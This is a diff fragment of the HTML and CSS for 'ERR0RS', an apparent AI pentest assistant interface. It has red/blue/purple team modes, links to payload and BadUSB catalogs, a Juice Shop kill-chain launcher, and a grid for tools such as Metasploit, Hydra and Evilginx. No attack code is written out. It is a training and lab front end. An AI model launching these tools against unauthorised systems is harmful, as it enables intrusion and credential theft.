+    .ltp-line.teach    { color: var(--amber);     border-left: 2px solid var(--amber); padding-left: 8px; margin: 4px 0; }
+    .ltp-line.teach-block { color: var(--cyan);   border-left: 3px solid var(--cyan); padding: 6px 10px; margin: 6px 0; background: rgba(0,245,255,.04); }
+    .ltp-line.error    { color: var(--red); }
+    .ltp-line.finding  { color: var(--green); font-weight: bold; }
+
+    /* Input row */
+    #ltp-input-row {
+      display: flex; align-items: center; padding: 5px 12px; gap: 8px;
+      border-top: 1px solid var(--border);
+      background: rgba(0,0,0,.5);
+      flex-shrink: 0;
+    }
+    #ltp-prompt { color: var(--green); white-space: nowrap; }
+    #ltp-input {
+      flex: 1; background: transparent; border: none; outline: none;
+      color: var(--text); font-family: 'Share Tech Mono', monospace;
+      font-size: .72rem; caret-color: var(--green);
+    }
+    #ltp-input::placeholder { color: var(--text-dim); }
+    .ltp-btn {
+      padding: 3px 10px; border-radius: 4px; font-size: .58rem; cursor: pointer;
+      font-family: 'Rajdhani', sans-serif; font-weight: 700; letter-spacing: 1px;
+      border: 1px solid; transition: all .2s;
+    }
+    #btn-teach-toggle {
+      border-color: var(--amber); color: var(--amber);
+      background: rgba(255,170,0,.06);
+    }
+    #btn-teach-toggle.on {
+      background: rgba(255,170,0,.2);
+      box-shadow: 0 0 8px rgba(255,170,0,.3);
+    }
+    #btn-ctrlc {
+      border-color: var(--red); color: var(--red);
+      background: rgba(255,34,85,.06);
+    }
+    #btn-ctrlc:hover { background: rgba(255,34,85,.2); }
+    #btn-open-term {
+      border-color: var(--neon); color: var(--neon);
+      background: rgba(191,111,255,.06); cursor: pointer;
+      padding: 3px 10px; border-radius: 4px; font-size: .58rem;
+      font-family: 'Rajdhani', sans-serif; font-weight: 700; letter-spacing: 1px;
+      border: 1px solid; transition: all .2s;
+    }
+    #btn-open-term:hover { background: rgba(191,111,255,.15); }
+
+    /* ── TERMINAL ROW (original bottom bar input) ── */
+    #term-row {
+      display:flex; align-items:center;
+      padding:5px 14px; gap:8px;
+      border-top:1px solid var(--border);
+      background:rgba(0,0,0,.3);
+      flex-shrink:0;
+    }
+    .t-prompt-lbl { color:var(--green); font-size:.72rem; white-space:nowrap; }
+    #term-input {
+      flex:1; background:transparent; border:none; outline:none;
+      color:var(--text); font-family:'Share Tech Mono',monospace;
+      font-size:.72rem; caret-color:var(--green);
+    }
+    #term-input::placeholder { color:var(--text-dim); }
+
+    /* scrollbars global */
+    ::-webkit-scrollbar { width:3px; }
+    ::-webkit-scrollbar-thumb { background:var(--purple-lo); border-radius:2px; }
+
+    /* ── ERR0RS REACTION OVERLAY (lightweight CSS walk) ── */
+    /* We show a glowing "paw" cursor that slides from center to button */
+    #paw {
+      position:fixed;
+      width:30px; height:30px;
+      border-radius:50%;
+      background:radial-gradient(circle, rgba(191,111,255,1) 0%, rgba(123,47,190,0) 70%);
+      box-shadow:0 0 16px var(--neon), 0 0 32px rgba(191,111,255,.4);
+      pointer-events:none;
+      z-index:9999;
+      opacity:0;
+      transition:left .45s cubic-bezier(.34,1.3,.64,1), top .45s cubic-bezier(.34,1.3,.64,1), opacity .3s;
+      transform:translate(-50%,-50%);
+    }
+
+    /* ERR0RS lean effect — when pressing a button he "leans" toward it */
+    #bg-img.lean-left  { transform-origin:center bottom; transition:transform .4s ease; transform:rotate(-3deg) translateX(-2%); }
+    #bg-img.lean-right { transform-origin:center bottom; transition:transform .4s ease; transform:rotate(3deg) translateX(2%); }
+    #bg-img.lean-none  { transition:transform .5s ease; transform:rotate(0deg) translateX(0); }
+
+    /* ══════════════════════════════════════════
+       SMART WIZARD PANEL
+    ══════════════════════════════════════════ */
+    #wizard-panel {
+      position: fixed;
+      left: 0; right: 340px; bottom: 120px;
+      background: rgba(4,0,14,.97);
+      backdrop-filter: blur(20px);
+      border: 1px solid var(--neon);
+      border-bottom: none;
+      border-radius: 12px 12px 0 0;
+      z-index: 8000;
+      flex-direction: column;
+      max-height: 68vh;
+      box-shadow: 0 -8px 40px rgba(123,47,190,.4), 0 0 0 1px rgba(191,111,255,.1);
+      transform: translateY(100%);
+      transition: transform .35s cubic-bezier(.34,1.2,.64,1), opacity .3s;
+      opacity: 0;
+      display: none;
+    }
+    #wizard-panel.active {
+      display: flex;
+      transform: translateY(0);
+      opacity: 1;
+    }
+    .wz-header {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 10px 18px 8px;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+      background: linear-gradient(90deg, rgba(123,47,190,.2), transparent);
+    }
+    .wz-title {
+      font-family: 'Orbitron', monospace; font-size: .72rem; font-weight: 700;
+      letter-spacing: 2px; color: var(--neon);
+      text-shadow: 0 0 12px rgba(191,111,255,.5);
+    }
+    .wz-close {
+      color: var(--text-dim); cursor: pointer; font-size: 1rem;
+      padding: 0 4px; transition: color .2s;
+    }
+    .wz-close:hover { color: var(--red); }
+    .wz-options {
+      display: flex; flex-wrap: wrap; gap: 8px;
+      padding: 12px 16px; overflow-y: auto; flex: 1;
+    }
+    .wz-options::-webkit-scrollbar { width: 3px; }
+    .wz-options::-webkit-scrollbar-thumb { background: var(--purple-lo); }
+    .wz-option {
+      flex: 1 1 calc(33% - 8px); min-width: 180px; max-width: calc(50% - 4px);
+      background: var(--panel); border: 1px solid var(--border);
+      border-radius: 8px; padding: 10px 12px; cursor: pointer;
+      transition: all .2s cubic-bezier(.34,1.3,.64,1); position: relative; overflow: hidden;
+    }
+    .wz-option::before {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(135deg, rgba(191,111,255,.06), transparent);
+      opacity: 0; transition: opacity .2s;
+    }
+    .wz-option:hover { border-color: var(--neon); transform: translateY(-2px); box-shadow: 0 4px 20px rgba(123,47,190,.3); }
+    .wz-option:hover::before { opacity: 1; }
+    .wz-option.selected {
+      border-color: var(--green); background: rgba(57,255,20,.04);
+      box-shadow: 0 0 16px rgba(57,255,20,.2), inset 0 0 12px rgba(57,255,20,.05);
+    }
+    .wz-option:active { transform: scale(.97); }
+    .wz-opt-label {
+      font-family: 'Rajdhani', sans-serif; font-weight: 700;
+      font-size: .75rem; letter-spacing: 1px; color: var(--neon); margin-bottom: 3px;
+    }
+    .wz-opt-desc { font-size: .62rem; color: var(--text); line-height: 1.4; margin-bottom: 5px; }
+    .wz-opt-cmd {
+      font-size: .55rem; color: var(--text-dim);
+      font-family: 'Share Tech Mono', monospace;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+    .wz-target-ph { color: var(--amber); font-weight: bold; }
+    .wz-target-row {
+      display: flex; align-items: center; gap: 8px;
+      padding: 8px 16px; border-top: 1px solid var(--border);
+      background: rgba(0,0,0,.3); flex-shrink: 0;
+    }
+    .wz-target-inp {
+      flex: 1; background: rgba(255,255,255,.05); border: 1px solid var(--border);
+      border-radius: 6px; padding: 6px 12px; color: var(--text);
+      font-family: 'Share Tech Mono', monospace; font-size: .75rem; outline: none;
+      transition: border-color .2s; caret-color: var(--green);
+    }
+    .wz-target-inp:focus { border-color: var(--neon); box-shadow: 0 0 8px rgba(191,111,255,.25); }
+    .wz-target-inp::placeholder { color: var(--text-dim); }
+    .wz-run-btn {
+      padding: 6px 18px; background: rgba(191,111,255,.15);
+      border: 1px solid var(--neon); border-radius: 6px; color: var(--neon);
+      font-family: 'Rajdhani', sans-serif; font-weight: 700;
+      font-size: .7rem; letter-spacing: 1px; cursor: pointer;
+      transition: all .2s; white-space: nowrap;
+    }
+    .wz-run-btn:hover { background: rgba(191,111,255,.3); box-shadow: 0 0 12px rgba(191,111,255,.3); }
+    .wz-teach-row {
+      display: flex; align-items: flex-start; gap: 8px;
+      padding: 7px 16px; background: rgba(255,170,0,.05);
+      border-top: 1px solid rgba(255,170,0,.2); flex-shrink: 0;
+    }
+    .wz-teach-icon { font-size: .9rem; flex-shrink: 0; }
+    .wz-teach-text { font-size: .63rem; color: var(--amber); line-height: 1.5; }
+    .wz-footer {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 5px 16px; border-top: 1px solid var(--border);
+      flex-shrink: 0; min-height: 26px;
+    }
+    .wz-cmd-preview {
+      font-family: 'Share Tech Mono', monospace; font-size: .6rem;
+      color: var(--green); opacity: .7; max-width: 60%;
+      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+
+<div id="app">
+
+  <!-- ══ TOPBAR ══ -->
+  <div id="topbar">
+    <div class="brand">3RR<em>0</em>RZ <span style="font-size:.65rem;color:var(--text-dim);letter-spacing:2px;">// VIRTUAL ASSISTANT</span></div>
+
+    <!-- ══ TEAM MODE SELECTOR ══ -->
+    <div id="team-mode-selector">
+      <div class="tm-btn tm-red active" id="tm-red" onclick="setTeamMode('red')" title="Red Team — Offensive Operations">
+        <span class="tm-dot">●</span>
+        <span class="tm-label">RED TEAM</span>
+        <span class="tm-sub">OFFENSIVE</span>
+      </div>
+      <div class="tm-btn tm-blue" id="tm-blue" onclick="setTeamMode('blue')" title="Blue Team — Defense & Detection">
+        <span class="tm-dot">●</span>
+        <span class="tm-label">BLUE TEAM</span>
+        <span class="tm-sub">DEFENSE</span>
+      </div>
+      <div class="tm-btn tm-purple" id="tm-purple" onclick="setTeamMode('purple')" title="Purple Team — Learn Both Sides">
+        <span class="tm-dot">●</span>
+        <span class="tm-label">PURPLE TEAM</span>
+        <span class="tm-sub">INSTRUCTOR</span>
+      </div>
+    </div>
+
+    <div class="top-pills">
+      <span class="pill live">● REC</span>
+      <span class="pill online">● ONLINE</span>
+      <span class="pill npu" id="hailo-pill" style="opacity:0.35;cursor:pointer;"
+            onclick="checkHailoStatus()" title="Click to check Hailo-10H NPU status">
+        ⬡ HAILO NPU
+      </span>
+      <span class="pill" id="session-pill" style="border-color:var(--amber);color:var(--amber);cursor:pointer;" onclick="toggleSessionMenu()" title="Session Manager">💾 SESSION</span>
+      <span class="pill" style="border-color:var(--orange);color:var(--orange);cursor:pointer;" onclick="location.href='/payload_studio.html'" title="Payload Studio">⚡ PAYLOAD STUDIO</span>
+      <span class="pill" style="border-color:var(--amber);color:var(--amber);cursor:pointer;" onclick="location.href='/badusb_catalog.html'" title="BadUSB Catalog — 2165 payloads">🦆 BADUSB CATALOG</span>
+      <span class="pill" style="border-color:var(--purple-hi);color:var(--purple-hi);cursor:pointer;" onclick="location.href='/purple_team.html'" title="Purple Team Operator">🟣 PURPLE TEAM</span>
+    </div>
+    <div id="clock">00:00:00</div>
+  </div>
+
+  <!-- Session Save/Load dropdown -->
+  <div id="session-menu" style="display:none;">
+    <div class="sm-header">💾 SESSION MANAGER</div>
+    <div class="sm-row">
+      <input id="sm-name" type="text" placeholder="session name..." autocomplete="off"/>
+      <button onclick="saveSession()">SAVE</button>
+    </div>
+    <div class="sm-header" style="margin-top:8px;">SAVED SESSIONS</div>
+    <div id="sm-list"></div>
+    <div class="sm-row" style="margin-top:8px;justify-content:center;">
+      <button onclick="exportSession()" style="border-color:var(--cyan);color:var(--cyan);">⬇ EXPORT</button>
+      <button onclick="clearAllSessions()" style="border-color:var(--red);color:var(--red);">🗑 CLEAR ALL</button>
+    </div>
+  </div>
+
+  <!-- ══ ZOOM MAIN VIDEO — ERR0RS ══ -->
+  <div id="zoom-main">
+    <img id="bg-img" src="errz-bg.jpg" alt="ERR0RS" class="lean-none"
+         onerror="this.style.display='none';document.getElementById('bg-fallback').style.display='flex'"/>
+
+    <!-- Fallback SVG if image not found -->
+    <div id="bg-fallback" style="display:none;position:absolute;inset:0;align-items:center;justify-content:center;background:radial-gradient(ellipse at center, #1a0040 0%, #04000a 100%);">
+      <svg viewBox="0 0 300 340" width="260" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <radialGradient id="hg" cx="50%" cy="35%"><stop offset="0%" stop-color="#5b1fa0"/><stop offset="100%" stop-color="#1a0040"/></radialGradient>
+          <radialGradient id="fg" cx="50%" cy="40%"><stop offset="0%" stop-color="#0f0020"/><stop offset="100%" stop-color="#04000a"/></radialGradient>
+          <filter id="gf"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          <!-- Binary smoke particles -->
+          <filter id="smoke"><feGaussianBlur stdDeviation="8"/></filter>
+        </defs>
+        <!-- Smoke/binary background puffs -->
+        <g opacity=".25" filter="url(#smoke)">
+          <circle cx="80" cy="120" r="60" fill="#7b2fbe"/>
+          <circle cx="220" cy="100" r="50" fill="#5b1fa0"/>
+          <circle cx="150" cy="60"  r="40" fill="#3d1060"/>
+        </g>
+        <!-- Binary text floating -->
+        <g font-family="monospace" font-size="8" fill="#3d1060" opacity=".5">
+          <text x="20"  y="80">10110100 01</text>
+          <text x="180" y="95">1011 0101</text>
+          <text x="30"  y="160">01101001 10</text>
+          <text x="200" y="180">10010110</text>
+        </g>
+        <!-- Body / hoodie -->
+        <ellipse cx="150" cy="260" rx="90" ry="70" fill="url(#hg)" stroke="#7b2fbe" stroke-width="1.5"/>
+        <!-- f_society patch -->
+        <rect x="116" y="230" width="68" height="52" rx="5" fill="#0a0015" stroke="#2d0a60" stroke-width="1"/>
+        <text x="150" y="248" text-anchor="middle" font-family="monospace" font-size="9" fill="#bf6fff">f_s0c1ety</text>
+        <rect x="122" y="252" width="56" height="22" rx="3" fill="#04000a"/>
+        <text x="150" y="267" text-anchor="middle" font-family="monospace" font-size="8" fill="#7b2fbe">f_s0c1ety</text>
+        <!-- BAPE camo pants hint -->
+        <ellipse cx="150" cy="320" rx="80" ry="20" fill="#0d1f00" stroke="#1a3300" stroke-width="1"/>
+        <text x="150" y="325" text-anchor="middle" font-family="monospace" font-size="7" fill="#39ff14">▓▒░▓▒░▓▒░▓▒░</text>
+        <!-- Hood -->
+        <ellipse cx="150" cy="160" rx="86" ry="90" fill="url(#hg)" stroke="#7b2fbe" stroke-width="1.5"/>
+        <!-- Cat ears -->
+        <polygon points="76,98 56,48 100,88" fill="#5b1fa0" stroke="#7b2fbe" stroke-width="1.5"/>
+        <polygon points="79,96 66,62 98,90" fill="#1a0040"/>
+        <polygon points="224,98 244,48 200,88" fill="#5b1fa0" stroke="#7b2fbe" stroke-width="1.5"/>
+        <polygon points="221,96 234,62 202,90" fill="#1a0040"/>
+        <!-- Face -->
+        <ellipse cx="150" cy="172" rx="72" ry="76" fill="url(#fg)" stroke="#1e0040" stroke-width="1"/>
+        <!-- Glowing eyes -->
+        <g filter="url(#gf)">
+          <ellipse cx="124" cy="164" rx="16" ry="17" fill="#bf6fff"/>
+          <ellipse cx="176" cy="164" rx="16" ry="17" fill="#bf6fff"/>
+          <ellipse cx="124" cy="165" rx="9"  ry="10" fill="#7b2fbe"/>
+          <ellipse cx="176" cy="165" rx="9"  ry="10" fill="#7b2fbe"/>
+          <circle  cx="127" cy="161" r="3"  fill="white"/>
+          <circle  cx="179" cy="161" r="3"  fill="white"/>
+        </g>
+        <!-- Smile -->
+        <path d="M 133 196 Q 150 210 167 196" stroke="#bf6fff" stroke-width="2.5" fill="none" stroke-linecap="round"/>
+        <!-- Nose -->
+        <ellipse cx="150" cy="186" rx="7" ry="4" fill="#1e0040"/>
+        <!-- l33t title glow -->
+        <g filter="url(#gf)" opacity=".7">
+          <text x="150" y="28" text-anchor="middle" font-family="'Orbitron',monospace" font-size="22" font-weight="900" fill="#bf6fff">3RR0RZ</text>
+        </g>
+        <text x="150" y="28" text-anchor="middle" font-family="'Orbitron',monospace" font-size="22" font-weight="900" fill="#c084fc" stroke="#7b2fbe" stroke-width=".5">3RR0RZ</text>
+        <text x="150" y="42" text-anchor="middle" font-family="monospace" font-size="8" fill="#7b2fbe" letter-spacing="3">VIRTUAL ASSISTANT</text>
+      </svg>
+    </div>
+
+    <div class="zoom-chrome"></div>
+    <div class="zoom-border" id="zoom-border"></div>
+
+    <!-- Floating speech bubble -->
+    <div id="speech">Initializing ERR0RS engine... awaiting your command, operator.</div>
+
+    <!-- Name tag -->
+    <div class="name-tag">
+      <div class="nt-dot"></div>
+      <div>
+        <div class="nt-name">ERR0RS</div>
+        <div class="nt-role">AI PENTEST ASSISTANT // HAILO NPU</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ RIGHT PANEL ══ -->
+  <div id="right-panel">
+
+    <!-- Self-view (operator "camera") -->
+    <div id="self-view">
+      <div class="sv-lines" id="sv-lines">
+        <span class="sv-line"><span style="color:var(--green)">ERR0RS@phoenix</span><span style="color:var(--text-dim)">:~$</span></span>
+        <span class="sv-line" style="color:var(--text-dim)">nmap -sV 192.168.1.0/24</span>
+        <span class="sv-line" style="color:var(--green)">Starting Nmap 7.94...</span>
+        <span class="sv-line" style="color:var(--text-dim)">Scanning 256 hosts</span>
+        <span class="sv-line" style="color:var(--neon)">PORT   STATE  SERVICE</span>
+        <span class="sv-line" style="color:var(--text-dim)">22/tcp open   ssh</span>
+        <span class="sv-line" style="color:var(--amber)">80/tcp open   http</span>
+        <span class="sv-line" style="color:var(--text-dim)">443/tcp open  https</span>
+        <span class="sv-line"><span class="sv-cursor"></span></span>
+      </div>
+      <div class="self-view-label">YOU // OPERATOR</div>
+    </div>
+
+    <!-- Pentest phases -->
+    <div class="rp-header"><span class="rp-dot"></span>PENTEST PHASES</div>
+    <div id="phase-list">
+      <div class="ph done">   <div class="ph-dot"></div>01 // RECON</div>
+      <div class="ph active"> <div class="ph-dot"></div>02 // SCANNING</div>
+      <div class="ph pending"><div class="ph-dot"></div>03 // ENUMERATION</div>
+      <div class="ph pending"><div class="ph-dot"></div>04 // EXPLOITATION</div>
+      <div class="ph pending"><div class="ph-dot"></div>05 // POST-EXPLOIT</div>
+      <div class="ph pending"><div class="ph-dot"></div>06 // REPORTING</div>
+    </div>
+
+    <!-- Intel feed -->
+    <div class="rp-section">
+      <div class="rp-header"><span class="rp-dot"></span>INTEL FEED</div>
+      <div id="intel-feed">
+        <div class="ic">
+          <div class="ic-ts">--:--:--</div>
+          <div class="ic-ttl">◉ BOOTING ERR0RS...</div>
+          <div class="ic-body">Fetching live system status...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Stat bars -->
+    <div style="padding:10px 12px; border-top:1px solid var(--border); flex-shrink:0;">
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <div>
+          <div style="display:flex;justify-content:space-between;font-size:.58rem;color:var(--text-dim);margin-bottom:3px;">
+            <span>NPU</span><span id="npu-val">24%</span>
+          </div>
+          <div style="height:3px;background:var(--border);border-radius:2px;">
+            <div id="npu-bar" style="height:100%;width:24%;background:linear-gradient(90deg,var(--purple),var(--neon));border-radius:2px;box-shadow:0 0 6px var(--purple);transition:width .6s;"></div>
+          </div>
+        </div>
+        <div>
+          <div style="display:flex;justify-content:space-between;font-size:.58rem;color:var(--text-dim);margin-bottom:3px;">
+            <span>RAM</span><span id="ram-val">41%</span>
+          </div>
+          <div style="height:3px;background:var(--border);border-radius:2px;">
+            <div id="ram-bar" style="height:100%;width:41%;background:linear-gradient(90deg,#0d4400,var(--green));border-radius:2px;box-shadow:0 0 6px var(--green);transition:width .6s;"></div>
+          </div>
+        </div>
+        <div>
+          <div style="display:flex;justify-content:space-between;font-size:.58rem;color:var(--text-dim);margin-bottom:3px;">
+            <span>NET</span><span id="net-val">8%</span>
+          </div>
+          <div style="height:3px;background:var(--border);border-radius:2px;">
+            <div id="net-bar" style="height:100%;width:8%;background:linear-gradient(90deg,#003344,var(--cyan));border-radius:2px;box-shadow:0 0 6px var(--cyan);transition:width .6s;"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ BOTTOM — TOOL GRID + TERMINAL ══ -->
+  <div id="bottom-bar">
+
+    <!-- ══ ERR0RS OPERATOR CHAT — natural language command bar ══ -->
+    <div id="op-chat-bar" style="
+      display:flex; align-items:center; gap:8px; padding:8px 12px;
+      background:linear-gradient(90deg, rgba(0,215,255,.08), rgba(123,47,190,.12));
+      border-bottom:1px solid var(--purple-lo);">
+      <span style="font-size:.7rem;color:var(--cyan);font-family:'Orbitron',monospace;letter-spacing:.1em;font-weight:700;">
+        🧠 ERR0RS
+      </span>
+      <input id="op-chat-input" placeholder="Talk to ERR0RS: 'nmap -sS 10.0.0.1', 'target is 192.168.1.5', 'auto full chain', 'teach sqlmap'..."
+        style="flex:1;background:#08001a;border:1px solid var(--cyan);color:var(--cyan);
+               font-family:'Share Tech Mono',monospace;font-size:.78rem;
+               padding:6px 12px;border-radius:4px;outline:none;"/>
+      <button onclick="sendToOperator()" style="
+        background:linear-gradient(135deg,#00d7ff,#7b2fbe);
+        border:none;color:#fff;font-family:'Orbitron',monospace;
+        font-size:.65rem;letter-spacing:.1em;padding:6px 16px;
+        border-radius:4px;cursor:pointer;font-weight:700;">
+        ▶ SEND
+      </button>
+      <span id="op-mode-badge" style="font-size:.6rem;color:var(--text-dim);
+        font-family:'Orbitron',monospace;padding:3px 8px;border:1px solid var(--purple-lo);
+        border-radius:3px;">MANUAL</span>
+    </div>
+
+    <!-- ══ KILL CHAIN LAUNCHER BAR ══ -->
+    <div id="kc-bar" style="
+      display:flex; align-items:center; gap:10px; padding:6px 12px 4px;
+      background:rgba(123,47,190,.13); border-bottom:1px solid var(--purple-lo);
+      flex-wrap:wrap;">
+      <span style="font-size:.65rem;color:var(--purple-hi);font-family:'Orbitron',monospace;letter-spacing:.08em;">
+        🎯 JUICE SHOP KILL CHAIN
+      </span>
+      <input id="kc-target" value="localhost:3000"
+        style="background:#08001a;border:1px solid var(--purple);color:var(--cyan);
+               font-family:'Share Tech Mono',monospace;font-size:.72rem;
+               padding:3px 8px;border-radius:3px;width:170px;"/>
+      <button onclick="launchKillChain()" style="
+        background:linear-gradient(135deg,#7b2fbe,#c084fc);
+        border:none;color:#fff;font-family:'Orbitron',monospace;
+        font-size:.62rem;letter-spacing:.1em;padding:4px 14px;
+        border-radius:3px;cursor:pointer;font-weight:700;">
+        🔥 RUN KILL CHAIN
+      </button>
+      <button id="op-pause-btn" onclick="pauseResumeAuto()" style="
+        background:transparent;border:1px solid var(--amber);color:var(--amber);
+        font-family:'Orbitron',monospace;font-size:.58rem;padding:3px 10px;
+        border-radius:3px;cursor:pointer;display:none;">
+        ⏸ PAUSE
+      </button>
+      <button onclick="sendToOperator('report')" style="
+        background:transparent;border:1px solid var(--green);color:var(--green);
+        font-family:'Orbitron',monospace;font-size:.58rem;padding:3px 10px;
+        border-radius:3px;cursor:pointer;">
+        📄 REPORT
+      </button>
+      <button onclick="window.open('juice_tracker.html','_blank')" style="
+        background:transparent;border:1px solid var(--cyan);color:var(--cyan);
+        font-family:'Orbitron',monospace;font-size:.58rem;padding:3px 10px;
+        border-radius:3px;cursor:pointer;">
+        📊 TRACKER
+      </button>
+      <span id="kc-status" style="font-size:.62rem;color:var(--text-dim);margin-left:auto;"></span>
+    </div>
+
+    <div class="bb-header">
+      <span class="bb-label">TOOL GRID // QUICK LAUNCH</span>
+      <span style="font-size:.58rem;color:var(--text-dim);">CLICK A TOOL — ERR0RS WILL PRESS IT</span>
+    </div>
+    <div id="tool-grid">
+      <!-- RED TEAM / OFFENSIVE -->
+      <div class="tb offensive"
+           onclick="openToolPanel('nmap')"
+           oncontextmenu="event.preventDefault();openToolPanel('nmap')"
+           title="Click: Tool Anatomy Panel — learn flags, build command, FIRE">
+        <div class="tb-icon">🌐</div><div class="tb-name">NMAP</div><div class="tb-cat">RECON</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('metasploit')" oncontextmenu="event.preventDefault();openToolPanel('metasploit')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">💣</div><div class="tb-name">MSF</div><div class="tb-cat">EXPLOIT</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive"
+           onclick="openToolPanel('sqlmap')"
+           oncontextmenu="event.preventDefault();openToolPanel('sqlmap')"
+           title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🗄️</div><div class="tb-name">SQLMAP</div><div class="tb-cat">WEB</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive"
+           onclick="openToolPanel('hydra')"
+           oncontextmenu="event.preventDefault();openToolPanel('hydra')"
+           title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🔑</div><div class="tb-name">HYDRA</div><div class="tb-cat">CREDS</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive"
+           onclick="openToolPanel('nikto')"
+           oncontextmenu="event.preventDefault();openToolPanel('nikto')"
+           title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🕷️</div><div class="tb-name">NIKTO</div><div class="tb-cat">WEB SCAN</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive"
+           onclick="openToolPanel('gobuster')"
+           oncontextmenu="event.preventDefault();openToolPanel('gobuster')"
+           title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">📂</div><div class="tb-name">GOBUSTER</div><div class="tb-cat">FUZZ</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('aircrack-ng')" oncontextmenu="event.preventDefault();openToolPanel('aircrack-ng')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">📡</div><div class="tb-name">AIRCRACK</div><div class="tb-cat">WIRELESS</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('evilginx2')" oncontextmenu="event.preventDefault();openToolPanel('evilginx2')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🎣</div><div class="tb-name">EVILGINX</div><div class="tb-cat">PHISHING</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('hashcat')" oncontextmenu="event.preventDefault();openToolPanel('hashcat')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">⚡</div><div class="tb-name">HASHCAT</div><div class="tb-cat">CRACK</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('nuclei')" oncontextmenu="event.preventDefault();openToolPanel('nuclei')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">☢️</div><div class="tb-name">NUCLEI</div><div class="tb-cat">VULN</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('amass')" oncontextmenu="event.preventDefault();openToolPanel('amass')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🔍</div><div class="tb-name">AMASS</div><div class="tb-cat">OSINT</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('subfinder')" oncontextmenu="event.preventDefault();openToolPanel('subfinder')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🌊</div><div class="tb-name">SUBFINDER</div><div class="tb-cat">SUBDOMAIN</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('ffuf')" oncontextmenu="event.preventDefault();openToolPanel('ffuf')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">💥</div><div class="tb-name">FFUF</div><div class="tb-cat">FUZZ</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb offensive" onclick="openToolPanel('enum4linux')" oncontextmenu="event.preventDefault();openToolPanel('enum4linux')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🏴</div><div class="tb-name">ENUM4LINUX</div><div class="tb-cat">SMB/AD</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <!-- BLUE TEAM / DEFENSIVE — SOC Tools -->
+      <div class="tb defensive" onclick="openToolPanel('wireshark')" oncontextmenu="event.preventDefault();openToolPanel('wireshark')" title="Click: Tool Anatomy Panel">
+        <div class="tb-icon">🦈</div><div class="tb-name">WIRESHARK</div><div class="tb-cat">TRAFFIC</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('tcpdump')" oncontextmenu="event.preventDefault();openToolPanel('tcpdump')" title="Click: Tool Anatomy Panel — tcpdump">
+        <div class="tb-icon">🚨</div><div class="tb-name">TCPDUMP</div><div class="tb-cat">SOC/DETECT</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('snort')" oncontextmenu="event.preventDefault();openToolPanel('snort')" title="Click: Tool Anatomy Panel — snort/IDS">
+        <div class="tb-icon">🔌</div><div class="tb-name">SNORT</div><div class="tb-cat">SOC/IDS</div>
+        <div style="position:absolute;top:2px;right:3px;font-size:8px;color:#7b2fbe;">📖</div>
+      </div>
+      <div class="tb defensive" onclick="openToolPanel('netstat')" oncontextmenu="event.preventDefault();openToolPanel('netstat')" title="Click: Tool Anatomy Panel — netstat">
+        <div class="tb-icon">🚪</div><div class="tb-name">NETSTAT</div><div class="tb-cat">SOC/NETWORK</div>
